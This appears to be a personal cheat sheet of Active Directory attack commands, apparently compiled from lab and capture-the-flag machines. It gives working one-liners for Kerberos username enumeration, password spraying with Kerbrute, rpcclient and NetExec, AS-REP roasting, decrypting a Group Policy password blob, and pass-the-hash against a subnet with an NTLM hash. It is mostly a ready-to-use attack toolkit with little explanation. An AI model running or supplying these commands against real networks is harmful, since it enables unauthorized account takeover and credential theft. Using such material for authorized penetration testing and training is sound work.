## Kerbrute
#### check if usernames are valid:
```bash
/opt/kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users.txt
```
- reformat with vim command `:%s/^.*VALID USERNAME:\s*\(\w\+\)@hutch\.offsec.*$/\1/`
- returns weird hash, use `GetNPUsers.py` instead to get hash
#### Spray valid users with password Welcome1:
```bash
/opt/kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

---
## RPC
#### Spray valid users with password Welcome1:
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

---
## Kerberos, port 88
```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip>
```

#### as-rep roast
```bash
GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile users.txt
```

decrypting group policy passwords
```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

---
## NetExec
#### Try local authentication
```bash
nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

#### try usernames as passwords:
```bash
nxc smb 10.129.231.149 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

try lowercase usernames as passwords:
- `cp users.txt users_lowercase.txt`
- vim command to convert all letters to lowercase
	- `:%s/[A-Z]/\L&/g`
```bash
nxc smb 10.129.42.194 -u users.txt -p users_lowercase.txt  --no-bruteforce --continue-on-success
```

---
## CrackMapExec
```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
#### Filter for successes
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```